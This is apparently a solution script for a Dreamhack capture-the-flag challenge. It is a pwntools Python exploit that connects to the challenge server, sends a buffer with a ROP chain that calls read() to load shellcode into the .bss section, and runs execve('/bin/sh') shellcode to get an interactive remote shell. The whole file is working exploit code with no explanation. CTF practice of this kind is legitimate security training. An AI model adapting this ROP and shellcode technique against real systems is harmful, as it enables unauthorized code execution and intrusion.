from pwn import *

context.arch='amd64'
HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 18552
r = remote(HOST, PORT)

payload = b'DREAMHACK!'

lst = []
for i in range(118, -1, -1):
    lst.append(i)

lst = bytearray(lst)
payload += lst

payload += b'\x00' * (8 - (len(payload) % 8))

pop_rdi = 0x4006f3
pop_rsi_r15 = 0x4006f1
pop_rdx = 0x40057b
bss = 0x60104b

read_plt = 0x400470
memset_got = 0x601018

sh=asm('''
    xor rax, rax
    push rax
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    mov rax, 59
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(pop_rdx) + p64(len(sh)+1)
payload += p64(read_plt)
payload += p64(bss)

r.sendline(payload)
r.sendline(sh)

r.interactive()